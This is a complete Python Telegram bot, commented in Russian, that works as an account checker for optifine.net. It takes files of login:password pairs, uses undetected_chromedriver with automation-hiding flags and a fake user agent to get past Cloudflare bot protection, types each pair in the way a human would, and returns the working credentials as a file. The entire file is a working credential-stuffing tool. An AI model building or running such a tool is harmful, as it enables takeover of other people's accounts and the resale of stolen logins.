import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
import tempfile
from datetime import datetime
from typing import Dict, List, Tuple

# Используем undetected_chromedriver
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Хранилище сессий
pending_confirmations = {}

# Создаем директории
os.makedirs('/app/debug', exist_ok=True)
os.makedirs('/app/sessions', exist_ok=True)

class OptifineChecker:
    """Проверка аккаунтов с подтверждением через скриншоты"""
    
    def __init__(self):
        self.driver = None
        self.session_id = None
        self.xvfb_process = None
        self.cloudflare_confirmed = False
        logger.info("🚀 Инициализация OptifineChecker...")
    
    def start_xvfb(self):
        """Запускает Xvfb для эмуляции дисплея"""
        try:
            # Проверяем, не запущен ли уже Xvfb
            result = subprocess.run(['pgrep', 'Xvfb'], capture_output=True)
            if result.returncode == 0:
                logger.info("✅ Xvfb уже запущен")
                return True
            
            # Запускаем Xvfb
            logger.info("🖥️ Запускаю Xvfb...")
            self.xvfb_process = subprocess.Popen(
                ['Xvfb', ':99', '-screen', '0', '1920x1080x24'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Устанавливаем DISPLAY
            os.environ['DISPLAY'] = ':99'
            
            # Ждем запуска
            time.sleep(2)
            
            logger.info("✅ Xvfb запущен")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка запуска Xvfb: {e}")
            return False
    
    def stop_xvfb(self):
        """Останавливает Xvfb"""
        if self.xvfb_process:
            try:
                self.xvfb_process.terminate()
                self.xvfb_process.wait(timeout=5)
                logger.info("✅ Xvfb остановлен")
            except:
                pass
    
    def init_driver(self):
        """Инициализация драйвера"""
        try:
            # Запускаем Xvfb
            if not self.start_xvfb():
                logger.error("❌ Не удалось запустить Xvfb")
                return False
            
            logger.info("🔍 Определяю версию Chrome...")
            
            # Получаем версию Chrome
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
            except Exception as e:
                chrome_version = 145
                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
            
            # Создаем временную директорию для профиля
            user_data_dir = tempfile.mkdtemp()
            
            # Настройки Chrome
            options = uc.ChromeOptions()
            
            # Основные настройки
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            options.add_argument('--headless=new')  # Важно: headless режим
            
            # Отключаем признаки автоматизации
            options.add_argument('--disable-blink-features=AutomationControlled')
            
            # Языковые настройки
            options.add_argument('--lang=en-US,en;q=0.9')
            
            # Реальный User-Agent
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
            
            # Игнорируем ошибки SSL
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            # Используем реальный профиль
            options.add_argument(f'--user-data-dir={user_data_dir}')
            options.add_argument('--profile-directory=Default')
            
            logger.info(f"🚀 Запускаю undetected_chromedriver...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=True  # headless режим
            )
            
            # Устанавливаем таймауты
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(10)
            
            logger.info("✅ Драйвер успешно инициализирован")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            return False
    
    def check_cloudflare_passed(self):
        """Проверяет, пройдена ли Cloudflare защита"""
        try:
            current_url = self.driver.current_url
            page_title = self.driver.title.lower()
            page_source = self.driver.page_source
            
            # Проверяем признаки Cloudflare
            if 'just a moment' in page_title:
                return False
            
            if 'cf-chl-widget' in page_source or 'turnstile' in page_source:
                return False
            
            # Проверяем наличие полей ввода
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible_inputs = [i for i in inputs if i.is_displayed() and 
                             i.get_attribute('type') not in ['hidden']]
            
            if len(visible_inputs) >= 1:
                logger.info("✅ Cloudflare пройден, найдены поля ввода")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка проверки Cloudflare: {e}")
            return False
    
    async def take_screenshot(self):
        """Делает скриншот и возвращает путь к файлу"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"/app/debug/screenshot_{timestamp}.png"
            self.driver.save_screenshot(filename)
            return filename
        except Exception as e:
            logger.error(f"❌ Ошибка создания скриншота: {e}")
            return None
    
    async def setup_manual_cloudflare(self, update, context):
        """Настраивает ручное прохождение Cloudflare через скриншоты"""
        
        session_id = f"{update.effective_user.id}_{int(time.time())}"
        self.cloudflare_confirmed = False
        
        try:
            # Открываем страницу входа
            logger.info("🌐 Открываю страницу входа...")
            self.driver.get("https://optifine.net/login")
            time.sleep(5)
            
            # Создаем клавиатуру
            keyboard = [
                [InlineKeyboardButton("✅ Я прошел капчу", callback_data=f"cf_done_{session_id}")],
                [InlineKeyboardButton("📸 Новый скриншот", callback_data=f"cf_screenshot_{session_id}")],
                [InlineKeyboardButton("❌ Отмена", callback_data=f"cf_cancel_{session_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Делаем первый скриншот
            screenshot = await self.take_screenshot()
            
            # Отправляем сообщение с инструкцией и первым скриншотом
            if screenshot:
                with open(screenshot, 'rb') as f:
                    await update.message.reply_photo(
                        photo=f,
                        caption=f"🖥️ **Требуется подтверждение Cloudflare**\n\n"
                                f"1️⃣ Посмотри на скриншот - там страница с капчей\n"
                                f"2️⃣ Бот сейчас нажимает на галочку автоматически\n"
                                f"3️⃣ Если автоматически не получается, нажми кнопку\n\n"
                                f"⏳ У тебя есть 5 минут\n"
                                f"🆔 ID: `{session_id}`",
                        reply_markup=reply_markup
                    )
            else:
                await update.message.reply_text(
                    f"⚠️ **Требуется подтверждение Cloudflare**\n\n"
                    f"Бот пытается автоматически нажать на галочку.\n"
                    f"Если через 30 секунд ничего не изменится - нажми кнопку.",
                    reply_markup=reply_markup
                )
            
            # Сохраняем информацию о сессии
            pending_confirmations[session_id] = {
                'user_id': update.effective_user.id,
                'checker': self,
                'message': update.message,
                'context': context
            }
            
            # Ожидаем подтверждения и отправляем скриншоты каждые 15 секунд
            start_time = time.time()
            last_screenshot_time = 0
            
            while time.time() - start_time < 300:  # 5 минут
                # Проверяем флаг
                if self.cloudflare_confirmed:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="✅ **Cloudflare пройден! Начинаю проверку...**"
                    )
                    return True
                
                # Автоматическая проверка
                if self.check_cloudflare_passed():
                    self.cloudflare_confirmed = True
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="✅ **Cloudflare пройден автоматически! Начинаю проверку...**"
                    )
                    return True
                
                # Отправляем новый скриншот каждые 15 секунд
                current_time = time.time()
                if current_time - last_screenshot_time >= 15:
                    screenshot = await self.take_screenshot()
                    if screenshot:
                        with open(screenshot, 'rb') as f:
                            await context.bot.send_photo(
                                chat_id=update.effective_chat.id,
                                photo=f,
                                caption=f"📸 Скриншот (прошло {int(current_time - start_time)}с)"
                            )
                    last_screenshot_time = current_time
                
                await asyncio.sleep(2)
            
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ **Время ожидания истекло**"
            )
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return False
    
    async def handle_confirmation_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обрабатывает кнопки"""
        query = update.callback_query
        await query.answer()
        
        data = query.data
        session_id = data.split('_')[-1]
        
        if session_id not in pending_confirmations:
            await query.edit_message_text("❌ **Сессия устарела**")
            return
        
        session_info = pending_confirmations[session_id]
        checker = session_info['checker']
        
        if query.from_user.id != session_info['user_id']:
            await query.answer("❌ Не ваша сессия!", show_alert=True)
            return
        
        if data.startswith('cf_done'):
            # Проверяем, пройдена ли Cloudflare
            if checker.check_cloudflare_passed():
                checker.cloudflare_confirmed = True
                await query.edit_message_text("✅ **Cloudflare пройден! Продолжаю...**")
            else:
                # Делаем скриншот
                screenshot = await checker.take_screenshot()
                if screenshot:
                    with open(screenshot, 'rb') as f:
                        await context.bot.send_photo(
                            chat_id=query.message.chat_id,
                            photo=f,
                            caption="❌ **Cloudflare все еще активен**\n\n"
                                    "Видишь на скриншоте капчу? Бот пытается нажать.\n"
                                    "Если не получается - попробуй позже."
                        )
                await query.delete_message()
        
        elif data.startswith('cf_screenshot'):
            # Отправляем новый скриншот
            screenshot = await checker.take_screenshot()
            if screenshot:
                with open(screenshot, 'rb') as f:
                    await context.bot.send_photo(
                        chat_id=query.message.chat_id,
                        photo=f,
                        caption="📸 **Текущее состояние браузера**"
                    )
            await query.delete_message()
        
        elif data.startswith('cf_cancel'):
            await query.edit_message_text("❌ **Операция отменена**")
            del pending_confirmations[session_id]
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        if not self.driver:
            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
        
        try:
            # Поиск полей (упрощенный вариант)
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            email_field = None
            password_field = None
            
            for inp in inputs:
                if inp.is_displayed():
                    input_type = inp.get_attribute('type')
                    if input_type == 'text' or input_type == 'email':
                        email_field = inp
                    elif input_type == 'password':
                        password_field = inp
            
            if not email_field or not password_field:
                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
            
            # Поиск кнопки
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            submit_button = None
            for btn in buttons:
                if btn.is_displayed() and ('login' in btn.text.lower() or 'sign' in btn.text.lower()):
                    submit_button = btn
                    break
            
            if not submit_button:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Вводим данные
            email_field.clear()
            for char in login:
                email_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            password_field.clear()
            for char in password:
                password_field.send_keys(char)
                time.sleep(0.03)
            
            time.sleep(0.5)
            
            # Нажимаем кнопку
            submit_button.click()
            time.sleep(5)
            
            # Проверяем результат
            current_url = self.driver.current_url
            if 'downloads' in current_url or 'profile' in current_url:
                return {'login': login, 'password': password, 'status': 'valid'}
            else:
                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass
        self.stop_xvfb()

# --- Telegram handlers ---

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    try:
        files = os.listdir('/app/debug')
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            with open(file_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=file,
                    caption=f"📁 **Debug:** `{file}`"
                )
            sent += 1
            await asyncio.sleep(1)
        
        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    checker = OptifineChecker()
    results = {'valid': [], 'invalid': [], 'errors': []}
    
    msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        # Парсим аккаунты
        accounts = []
        for line in content.strip().split('\n'):
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append((login.strip(), password.strip()))
        
        total = len(accounts)
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов**")
            return
        
        await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🛡️ **Запускаю браузер...**")
        
        # Инициализируем драйвер
        if not checker.init_driver():
            await msg.edit_text("❌ **Ошибка инициализации**\n\nПроверь логи через /debug")
            return
        
        # Проходим Cloudflare
        await msg.edit_text("🔄 **Обрабатываю Cloudflare...**\n\nБот попытается нажать галочку автоматически. Если не получится - будут скриншоты.")
        success = await checker.setup_manual_cloudflare(update, context)
        
        if not success:
            await msg.edit_text("❌ **Cloudflare не пройден**\n\nПопробуй позже или используй /debug")
            checker.close()
            return
        
        # Проверяем аккаунты
        await msg.edit_text(f"✅ **Cloudflare пройден!**\n\nПроверяю {total} аккаунтов...")
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 3 == 0:
                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {len(results['valid'])}")
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        # Отправляем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"Всего: {total}\n"
            f"✅ Рабочих: {len(results['valid'])}\n"
            f"❌ Нерабочих: {len(results['invalid'])}"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        checker.close()
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Checker**\n\n"
        f"🔍 **Как это работает:**\n"
        f"1️⃣ Отправь .txt файл с аккаунтами\n"
        f"2️⃣ Бот откроет браузер и попытается нажать галочку\n"
        f"3️⃣ Если не получится - будут скриншоты\n"
        f"4️⃣ Ты увидишь результат проверки\n\n"
        f"📥 **Отправь файл для начала**\n\n"
        f"📊 Статистика: {bot_stats['total']} проверено, {bot_stats['valid']} рабочих",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    
    # Проверяем, это кнопка подтверждения Cloudflare?
    if query.data and query.data.startswith('cf_'):
        checker = OptifineChecker()
        await checker.handle_confirmation_callback(update, context)
        return
    
    await query.answer()
    
    if query.data == 'stats':
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}"
        )
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **ПОМОЩЬ**\n\n"
            "1. Создай .txt файл\n"
            "2. В каждой строке: логин:пароль\n"
            "3. Отправь файл боту\n"
            "4. Следи за скриншотами\n"
            "5. Если нужно - нажми кнопку подтверждения"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER (С КОНТРОЛЕМ ЧЕРЕЗ СКРИНШОТЫ)")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")

if __name__ == '__main__':
    main()